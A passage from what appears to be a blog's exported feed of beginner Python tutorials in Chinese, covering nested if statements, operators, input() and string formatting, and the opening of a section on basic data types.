href="#2-4-if嵌套" class="headerlink" title="2.4 if嵌套"></a>2.4 if嵌套</h3><p>很多新手容易困在在if嵌套中, 第一次感到学了那么久终于有点蒙蒙的感觉了, 感觉到绕人 ,记住mhx一句话, 保你以后遇到if嵌套, 分析的明明白白</p><p>口诀 : </p><p>顶级if先分析，条件成立走分支</p><p>分支如果再if，条件继续看起来</p><p>如果条件皆不立，else下代码就执行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的年龄:&#x27;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(age)</span><br><span class="line"><span class="keyword">if</span> <span class="number">18</span> &lt; age &lt; <span class="number">25</span>:</span><br><span class="line">    gender = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的性别:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> gender == <span class="string">&#x27;女&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;美女你好...&#x27;</span>)</span><br><span class="line">        is_merry = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_merry:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;刚好我也是单身..&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;哈哈哈,我也有女朋友了,打扰了..&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;对不起,妹子才是我所喜欢的,打扰了&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;打扰了,我们年龄不相仿..&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="3-小练习"><a href="#3-小练习" class="headerlink" title="3.小练习"></a>3.小练习</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">评判脚本小子挖洞战绩系统</span><br><span class="line"></span><br><span class="line">1.提示用户输入挖洞暗号 ( 暗号: 0776  )</span><br><span class="line">2.判断暗号是否正确,</span><br><span class="line">如果正确 提示用户输入id 和 提示用户输入漏洞数量</span><br><span class="line">            判断 漏洞个数</span><br><span class="line">            如果大于10 , 打印 亲爱的id , 这就是黑客吗   ( 格式化打印 )</span><br><span class="line">            如果大于5小于10 打印 亲爱的id, 战绩不错</span><br><span class="line">            如果大于2小于5  打印  亲爱的id , 还需努力</span><br><span class="line">            如果大于0小于2   打印 亲爱的id, 你今晚可以不用吃饭了</span><br><span class="line">        如果错误</span><br><span class="line">            打印 有内鬼 , 终止交易</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python运算符</title>
      <link href="/2023/04/02/python%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>/2023/04/02/python%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="python运算符"><a href="#python运算符" class="headerlink" title="python运算符"></a>python运算符</h1><h2 id="1-算术运算符"><a href="#1-算术运算符" class="headerlink" title="1. 算术运算符"></a>1. 算术运算符</h2><h3 id="1-1-什么是算数运算符"><a href="#1-1-什么是算数运算符" class="headerlink" title="1.1 什么是算数运算符"></a>1.1 什么是算数运算符</h3><p>就是做加减乘除四则运算以及其他的复杂运算的, 让计算机能像人一样可以做计算</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">相加</td></tr><tr><td align="center">-</td><td align="center">相减</td></tr><tr><td align="center">*</td><td align="center">相乘</td></tr><tr><td align="center">&#x2F;</td><td align="center">相除 (有小数部分,结果全是float类型)</td></tr><tr><td align="center">&#x2F;&#x2F;</td><td align="center">地板除 (只保留整数部分)</td></tr><tr><td align="center">%</td><td align="center">取余&#x2F;取模 (只保留余数)</td></tr><tr><td align="center">**</td><td align="center">幂运算</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span>/<span class="number">2</span>) <span class="comment"># 5.0 float类型</span></span><br></pre></td></tr></table></figure><p>重点提一嘴</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10 // 3   ==&gt; 3</span><br><span class="line">10 % 3   ==&gt; 1</span><br><span class="line">2 ** 3     ==&gt; 8</span><br></pre></td></tr></table></figure><h2 id="2-比较运算符"><a href="#2-比较运算符" class="headerlink" title="2. 比较运算符"></a>2. 比较运算符</h2><h3 id="2-1-什么是比较运算符"><a href="#2-1-什么是比较运算符" class="headerlink" title="2.1 什么是比较运算符"></a>2.1 什么是比较运算符</h3><p>就是做比较运算的, 让计算机能像人一样可以做比较</p><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&gt;</td><td align="center">大于</td></tr><tr><td align="center">&lt;</td><td align="center">小于</td></tr><tr><td align="center">&gt;&#x3D;</td><td align="center">大于等于</td></tr><tr><td align="center">&lt;&#x3D;</td><td align="center">小于等于</td></tr><tr><td align="center">&#x3D;&#x3D;</td><td align="center">等于</td></tr><tr><td align="center">!&#x3D;</td><td align="center">不等于</td></tr></tbody></table><h2 id="3-赋值运算符"><a href="#3-赋值运算符" class="headerlink" title="3. 赋值运算符"></a>3. 赋值运算符</h2><h3 id="3-1-什么是赋值运算符"><a href="#3-1-什么是赋值运算符" class="headerlink" title="3.1 什么是赋值运算符"></a>3.1 什么是赋值运算符</h3><p>就是做赋值操作的, 让计算机能像人一样给一个事物附上一个值, 记录下来</p><h4 id="3-1-1-增量赋值"><a href="#3-1-1-增量赋值" class="headerlink" title="3.1.1 增量赋值"></a>3.1.1 增量赋值</h4><table><thead><tr><th align="center">符号</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">&#x3D;</td><td align="center">变量的赋值</td></tr><tr><td align="center">+&#x3D;</td><td align="center">加等于</td></tr><tr><td align="center">-&#x3D;</td><td align="center">减等于</td></tr><tr><td align="center">*&#x3D;</td><td align="center">乘等于</td></tr><tr><td align="center">&#x2F;&#x3D;</td><td align="center">除等于</td></tr><tr><td align="center">&#x2F;&#x2F;&#x3D;</td><td align="center">取整等于</td></tr><tr><td align="center">%&#x3D;</td><td align="center">取余等于</td></tr><tr><td align="center">**&#x3D;</td><td align="center">幂等于</td></tr></tbody></table><p>提一嘴 , 你在python会经常见到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x += 1  等价于 x = x +1</span><br></pre></td></tr></table></figure><h4 id="3-1-2-交叉赋值"><a href="#3-1-2-交叉赋值" class="headerlink" title="3.1.2 交叉赋值"></a>3.1.2 交叉赋值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="number">10</span></span><br><span class="line">y = <span class="number">20</span></span><br><span class="line">x,y = y,x</span><br></pre></td></tr></table></figure><h4 id="3-1-3-链式赋值"><a href="#3-1-3-链式赋值" class="headerlink" title="3.1.3 链式赋值"></a>3.1.3 链式赋值</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=y=z = <span class="number">10</span></span><br><span class="line"><span class="comment"># 把栈区中的10的内存地址分别赋值给x,y,z</span></span><br></pre></td></tr></table></figure><h4 id="3-1-4-解压赋值"><a href="#3-1-4-解压赋值" class="headerlink" title="3.1.4 解压赋值"></a>3.1.4 解压赋值</h4><p>一般适合在取开头前几个或者末尾几个数据的值，不适合取数据量大的容器的中间值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x,y = [<span class="number">10</span>,<span class="number">20</span>]</span><br><span class="line"><span class="built_in">print</span>(x)   <span class="comment"># 10</span></span><br><span class="line"><span class="built_in">print</span>(y)   <span class="comment"># 20</span></span><br></pre></td></tr></table></figure><h2 id="4-逻辑运算符"><a href="#4-逻辑运算符" class="headerlink" title="4. 逻辑运算符"></a>4. 逻辑运算符</h2><h3 id="4-1-逻辑运算"><a href="#4-1-逻辑运算" class="headerlink" title="4.1 逻辑运算"></a>4.1 逻辑运算</h3><p>所谓的逻辑运算，你可以先简单的认为就是判断，比如今天下不下雨，下雨。这就一个判断。</p><h3 id="4-2-逻辑运算符"><a href="#4-2-逻辑运算符" class="headerlink" title="4.2 逻辑运算符"></a>4.2 逻辑运算符</h3><p>逻辑运算符就是用来把多个条件连在一起做判断的符号</p><table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td>not</td><td>非(取反)</td></tr><tr><td>and</td><td>与</td></tr><tr><td>or</td><td>或</td></tr></tbody></table><h4 id="4-2-1-not"><a href="#4-2-1-not" class="headerlink" title="4.2.1 not"></a>4.2.1 not</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># not: 就是把紧跟其后的那个条件结果取反</span></span><br><span class="line"><span class="comment"># not与紧跟其后的那个条件是一个不可分割的整体</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="number">16</span> &gt; <span class="number">13</span>) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">not</span> <span class="number">0</span>) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h4 id="4-2-2-and"><a href="#4-2-2-and" class="headerlink" title="4.2.2 and"></a>4.2.2 and</h4><p>and（逻辑与）用来连接左右两个条件。两个条件同时为真，最终结果才为真。如果连接多个条件, 条件全为真, 最终结果才是True.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="literal">True</span> <span class="keyword">and</span> <span class="number">10</span> &gt; <span class="number">1</span>) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">4</span> &gt; <span class="number">8</span> <span class="keyword">and</span> <span class="literal">False</span> )</span><br></pre></td></tr></table></figure><h4 id="4-2-3-or"><a href="#4-2-3-or" class="headerlink" title="4.2.3 or"></a>4.2.3 or</h4><p>or ( 逻辑或 ) 用来连接左右两个条件, 两个条件但凡有一个为True, 最终结果就为True, 两个条件都为False的情况, 最终结果才为False。</p><p>如果连接多个条件, 条件全为假, 最终结果才是False。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">3</span> &gt; <span class="number">2</span> <span class="keyword">or</span> <span class="literal">False</span>) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="literal">False</span> <span class="keyword">or</span> <span class="number">6</span> &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="number">7</span> &gt; <span class="number">99</span>) <span class="comment">#False</span></span><br></pre></td></tr></table></figure><h3 id="4-3-逻辑运算符的优先级-了解"><a href="#4-3-逻辑运算符的优先级-了解" class="headerlink" title="4.3 逻辑运算符的优先级 (了解)"></a>4.3 逻辑运算符的优先级 (了解)</h3><p>如果单独的就只是一串and&#x2F;or连接, 按照从左到右的顺序依次运算即可。如果是混合使用就要考虑优先级了。</p><h4 id="4-3-1-优先级"><a href="#4-3-1-优先级" class="headerlink" title="4.3.1 优先级"></a>4.3.1 优先级</h4><p>括号<code> ( ) &gt; not &gt; and &gt; or</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">3</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="number">4</span> &gt; <span class="number">3</span> <span class="keyword">or</span> <span class="number">1</span> == <span class="number">3</span> <span class="keyword">and</span> <span class="string">&#x27;x&#x27;</span> == <span class="string">&#x27;x&#x27;</span> <span class="keyword">or</span> <span class="number">3</span> &gt; <span class="number">3</span>) <span class="comment"># False</span></span><br></pre></td></tr></table></figure><p>这种混合运算一般不会出现在自己代码里, 只有面试题你会见到</p><p>小练习:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">not</span> <span class="number">3</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">5</span> &gt; <span class="number">7</span> <span class="keyword">or</span> <span class="number">7</span> &gt; <span class="number">9</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="number">3</span> == <span class="number">3</span> <span class="keyword">and</span> x==<span class="string">&#x27;x&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> &gt; <span class="number">4</span> <span class="keyword">and</span> <span class="number">5</span> &gt; <span class="number">7</span> <span class="keyword">and</span> <span class="number">7</span> &gt; <span class="number">9</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="number">3</span> == <span class="number">3</span> <span class="keyword">and</span> x==<span class="string">&#x27;x&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="4-4-短路运算-了解"><a href="#4-4-短路运算-了解" class="headerlink" title="4.4 短路运算 (了解)"></a>4.4 短路运算 (了解)</h3><p>短路运算：遵循偷懒原则，偷懒到哪个位置，就把当前位置的值返回。在面试题中，一般和逻辑运算符优先级一起考。注意一点，返回的值不一定是显示的布尔值，可能是隐式的布尔值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="literal">True</span>     <span class="comment"># 偷懒到True,所以返回True</span></span><br><span class="line"><span class="number">10</span> &lt; <span class="number">100</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">and</span> <span class="literal">True</span> <span class="comment"># 偷懒到0,返回0</span></span><br><span class="line"><span class="number">10</span> <span class="keyword">and</span> <span class="number">0</span> <span class="keyword">or</span> <span class="number">1</span> &gt; <span class="number">3</span> <span class="keyword">and</span> <span class="number">9</span> == <span class="number">9</span> <span class="keyword">or</span> <span class="number">80</span> &gt; <span class="number">70</span> <span class="comment"># 先看优先级,然后再看每个部分偷懒到哪里,然后再算最后的值 True</span></span><br></pre></td></tr></table></figure><h2 id="5-成员运算符"><a href="#5-成员运算符" class="headerlink" title="5. 成员运算符"></a>5. 成员运算符</h2><h3 id="5-1-in"><a href="#5-1-in" class="headerlink" title="5.1 in"></a>5.1 in</h3><p>成员运算符就是判断是否存在, 返回一个布尔值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 判断一个小字符串是否在一个大字符串中</span></span><br><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;zhenxiang&#x27;</span> ) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断元素是否存在于列表</span></span><br><span class="line"><span class="built_in">print</span>( <span class="number">10</span> <span class="keyword">in</span> [<span class="number">11</span>,<span class="number">10</span>,<span class="number">12</span>]) <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断key是否存在于字典</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;k1&#x27;</span> <span class="keyword">in</span> &#123;<span class="string">&#x27;k1&#x27;</span>:<span class="number">1</span>&#125;) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="5-2-not-in"><a href="#5-2-not-in" class="headerlink" title="5.2 not in"></a>5.2 not in</h3><p>判断是否不在，一般判断不存在时，推荐使用这种。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>( <span class="string">&#x27;mn&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&#x27;hello word&#x27;</span>) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h2 id="6-身份运算符"><a href="#6-身份运算符" class="headerlink" title="6. 身份运算符"></a>6. 身份运算符</h2><h3 id="6-1-is"><a href="#6-1-is" class="headerlink" title="6.1 is"></a>6.1 is</h3><p>is 就是身份运算符, 判断的是id是否相等, id( ) , 在cpython中返回的是程序运行时, 对象在内存中的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello mn&#x27;</span></span><br><span class="line">y = <span class="string">&#x27;hello mn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x <span class="keyword">is</span> y) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 但记住有的时候值相等未必id相等</span></span><br></pre></td></tr></table></figure><h3 id="6-2-is-not"><a href="#6-2-is-not" class="headerlink" title="6.2 is not"></a>6.2 is not</h3><p>判断身份不相同</p><h2 id="7-作业"><a href="#7-作业" class="headerlink" title="7.作业"></a>7.作业</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.笔记 , 一定要关键地方自己记</span><br><span class="line">2.所有课上我敲的代码 , 全部自己敲一遍 </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python与用户交互</title>
      <link href="/2023/04/02/python%E4%B8%8E%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/04/02/python%E4%B8%8E%E7%94%A8%E6%88%B7%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<h1 id="用户交互和运算符"><a href="#用户交互和运算符" class="headerlink" title="用户交互和运算符"></a>用户交互和运算符</h1><h2 id="1-用户交互"><a href="#1-用户交互" class="headerlink" title="1. 用户交互"></a>1. 用户交互</h2><h3 id="1-1-python3中的用户交互"><a href="#1-1-python3中的用户交互" class="headerlink" title="1.1 python3中的用户交互"></a>1.1 python3中的用户交互</h3><p>这里站在程序员 ( 人 ) 与计算机之间的交互, 本质就是你向计算机输入内容, 计算机输出内容, 反馈给你.</p><h4 id="1-1-1-接收用户的输入"><a href="#1-1-1-接收用户的输入" class="headerlink" title="1.1.1 接收用户的输入"></a>1.1.1 接收用户的输入</h4><p>通过input方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输入你的大名:&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="1-1-2-坑"><a href="#1-1-2-坑" class="headerlink" title="1.1.2 坑"></a>1.1.2 坑</h4><p>注意: 在python3中,无论用户输入什么input都会把它放到一对引号中, 就是把原数据类型, 转换成了字符串类型.</p><p>所以如果输入的int类型,想要进行四则运算, 那么就要自己手动进行一下类型转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">input</span>(<span class="string">&#x27;请输入数字&#x27;</span>)</span><br><span class="line">x = <span class="built_in">int</span>(x)</span><br><span class="line"><span class="built_in">print</span>(x + <span class="number">10</span>)</span><br></pre></td></tr></table></figure><h3 id="1-2-python2中的用户交互-了解"><a href="#1-2-python2中的用户交互-了解" class="headerlink" title="1.2 python2中的用户交互 (了解)"></a>1.2 python2中的用户交互 (了解)</h3><h4 id="1-2-1-raw-input"><a href="#1-2-1-raw-input" class="headerlink" title="1.2.1 raw_input( )"></a>1.2.1 raw_input( )</h4><p>python2中&#x3D;&#x3D;raw_input ( )&#x3D;&#x3D; 等同于python3中的input , 都是会把用户输入的内容转化成字符串类型</p><h4 id="1-2-2-input"><a href="#1-2-2-input" class="headerlink" title="1.2.2 input ( )"></a>1.2.2 input ( )</h4><p>python2中的input ( ), 不会自动更改用户输入内容的数据类型, 你输入什么类型,就返回什么类型的内容</p><p>你是不是突然感觉好方便, 不用做数据转换了, 但是你忽略了一点, 程序是给用户使用的, 虽然我们作为开发用python2中input ( ) 很方便, 但是对用户不是友好的, 因为如果你要使用就必须先了解python的基础数据类型,</p><p>如果是这样, 用户估计会口吐芬芳. 所以这些是在python发展中舍弃这种用户交互.</p><h2 id="2-格式化输出"><a href="#2-格式化输出" class="headerlink" title="2. 格式化输出"></a>2. 格式化输出</h2><p>输入是input 输出就是output，在python中输出用print体现出来。</p><h3 id="2-1-什么是格式化输出"><a href="#2-1-什么是格式化输出" class="headerlink" title="2.1 什么是格式化输出"></a>2.1 什么是格式化输出</h3><p>就是字面意思,按照一定的格式输出内容, 如: 输出班级中每个学生的姓名和年龄</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">姓名:xxx,年龄:xxx</span><br></pre></td></tr></table></figure><p>这个时候我们可以把格式理解成模板, 只需要替换里面的关键内容即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名:张三,年龄:18</span><br><span class="line">姓名:张四,年龄:19</span><br><span class="line">姓名:张五,年龄:20</span><br><span class="line">姓名:张六,年龄:21</span><br><span class="line">姓名:张七,年龄:22</span><br></pre></td></tr></table></figure><h3 id="2-2-格式化输出的三种方式"><a href="#2-2-格式化输出的三种方式" class="headerlink" title="2.2 格式化输出的三种方式"></a>2.2 格式化输出的三种方式</h3><h4 id="2-2-1-格式化"><a href="#2-2-1-格式化" class="headerlink" title="2.2.1 % 格式化"></a>2.2.1 % 格式化</h4><p>% 格式化是自从python诞生以来就有的一种格式化方法, 意思就是说python2可以用这种方法,python3也可以</p><p><strong>使用:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># %s 可以接收任意类型</span></span><br><span class="line">name = <span class="string">&#x27;alex&#x27;</span></span><br><span class="line"></span><br><span class="line">info = <span class="string">&#x27;大家好我叫%s&#x27;</span> % name</span><br><span class="line"><span class="built_in">print</span>(info) <span class="comment"># 大家好我叫alex</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># %d 只能接收int类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的年龄是%d&#x27;</span> % <span class="number">18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># %f 只能接收float类型</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;我的体重是%fkg&#x27;</span> % <span class="number">55.7</span>)</span><br></pre></td></tr></table></figure><h4 id="2-2-2-format-格式化"><a href="#2-2-2-format-格式化" class="headerlink" title="2.2.2 format ( ) 格式化"></a>2.2.2 format ( ) 格式化</h4><p>format ( ) 是在python2.6后出现的一种方法, 我们做格式化, 本质上是字符串的格式化, format ( ) 是字符串的一种内置方法, 是python解释器提供好的</p><p><strong>使用:</strong></p><ol><li><p>一般情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;我叫&#123;&#125;,今年&#123;&#125;岁&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;tom&#x27;</span>,<span class="number">18</span>) <span class="comment">#通过位置一一对应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></li><li><p>通过索引</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;我叫&#123;1&#125;,今年&#123;0&#125;岁&#x27;</span>.<span class="built_in">format</span>(<span class="number">18</span>,<span class="string">&#x27;tom&#x27;</span>) <span class="comment">#通过索引一一对应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></li><li><p>通过key&#x3D;value</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">&#x27;我叫&#123;name&#125;,今年&#123;age&#125;岁&#x27;</span>.<span class="built_in">format</span>(name=<span class="string">&#x27;tom&#x27;</span>,age=<span class="number">18</span>) <span class="comment">#通过key=value一一对应</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-2-3-f-格式化"><a href="#2-2-3-f-格式化" class="headerlink" title="2.2.3 f 格式化"></a>2.2.3 f 格式化</h4><p>f 格式化是python3.5以后才出现的一种更优雅的python格式化方式</p><p><strong>使用:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&#x27;请输入名字:&#x27;</span>)</span><br><span class="line">age = <span class="built_in">input</span>(<span class="string">&#x27;请输入年龄:&#x27;</span>)</span><br><span class="line">res = <span class="string">f&#x27;你的名字是<span class="subst">&#123;name&#125;</span>,年龄是<span class="subst">&#123;age&#125;</span>岁&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h3 id="2-3-三种格式化之间的速度"><a href="#2-3-三种格式化之间的速度" class="headerlink" title="2.3 三种格式化之间的速度"></a>2.3 三种格式化之间的速度</h3><ul><li>最快: f 格式化</li><li>其次: format( ) 格式化  [ 推荐这种方法 ]</li><li>最慢: % 格式化</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 基础数据类型</title>
      <link href="/2023/04/02/python%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%9D%E8%AF%86/"/>
      <url>/2023/04/02/python%E5%9F%BA%E7%A1%80%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%88%9D%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="python基础数据类型初识"><a href="#python基础数据类型初识" class="headerlink" title="python基础数据类型初识"></a>python基础数据类型初识</h1><p>变量我们都知道是让计算机像我们人一祥都够记忆事物的某种状态,但是我们知道状态是有着不同种类,于是引出了</p><p>数据 类型, 通过不同的数据类型可以记录不同的状态。</p><h2 id="1-数字类型"><a href="#1-数字类型" class="headerlink" title="1. 数字类型"></a>1. 数字类型</h2><p>python中没有数字类型这一说,只是为了更好的学习,人为的把整型和浮点型统称为数字类型.</p><h3 id="1-1-int整型"><a href="#1-1-int整型" class="headerlink" title="1.1 int整型"></a>1.1 int整型</h3><h4 id="1-1-1作用"><a href="#1-1-1作用" class="headerlink" title="1.1.1作用"></a>1.1.1作用</h4><p>用来记录用整数记录的 状态, 比如年份, 年龄 等</p><h4 id="1-1-1-定义"><a href="#1-1-1-定义" class="headerlink" title="1.1.1 定义"></a>1.1.1 定义</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line"></span><br><span class="line">year = <span class="number">1999</span></span><br></pre></td></tr></table></figure><h3 id="1-2-float浮点型"><a href="#1-2-float浮点型" class="headerlink" title="1.2 float浮点型"></a>1.2 float浮点型</h3><h4 id="1-2-1-作用"><a href="#1-2-1-作用" class="headerlink" title="1.2.1 作用"></a>1.2.1 作用</h4><p>用来记录用小数记录的状态，比如某些商品的价格，存款等</p><h4 id="1-2-2-定义"><a href="#1-2-2-定义" class="headerlink" title="1.2.2 定义"></a>1.2.2 定义</h4><figure class="highlight python"><table><tr><td 